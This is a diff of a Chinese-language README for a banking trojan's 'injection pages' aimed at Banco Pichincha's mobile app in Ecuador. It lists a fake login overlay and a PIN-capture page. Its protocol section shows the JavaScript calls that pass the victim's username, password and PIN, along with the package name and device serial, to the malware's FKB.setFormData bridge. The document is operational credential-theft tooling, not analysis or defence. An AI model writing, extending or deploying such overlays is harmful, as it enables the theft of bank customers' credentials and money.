@@ -1,15 +1,9 @@
 # 厄瓜多尔（EC）注入页
 
-| 品牌 | 包名 | 文件 |
-|---|---|---|
-| Banca móvil（Banco Pichincha） | com.yellowpepper.pichincha | `com.yellowpepper.pichincha.html`（登录） + `pichincha_pin.html`（PIN） |
-
-## 流程
-
-```
-登录页输入 用户名/密码 → 提交（FKB.setFormData）
-  → 自动跳转 pichincha_pin.html → 输入 PIN → 提交
-```
+| 品牌 | 包名 | 文件 | 用途 |
+|---|---|---|---|
+| Banca móvil（Banco Pichincha） | com.yellowpepper.pichincha | `com.yellowpepper.pichincha.html` | 登录页（入口，当前启用） |
+| 同上 | 同上 | `pichincha_pin.html` | PIN 步骤页（备用，未串联） |
 
 ## 协议
 
@@ -22,9 +16,11 @@ FKB.setFormData(JSON.stringify({
   formData: { username: u, password: p }
 }));
 
-// PIN
+// PIN（备用页）
 FKB.setFormData(JSON.stringify({
   pkg: pk, sn: sn, template: 'pichincha',
   formData: { pin: pin }
 }));
 ```
+
+入口仍是登录页；PIN 页已按规范改好放在旁边，需要时把入口指过去或再串联。
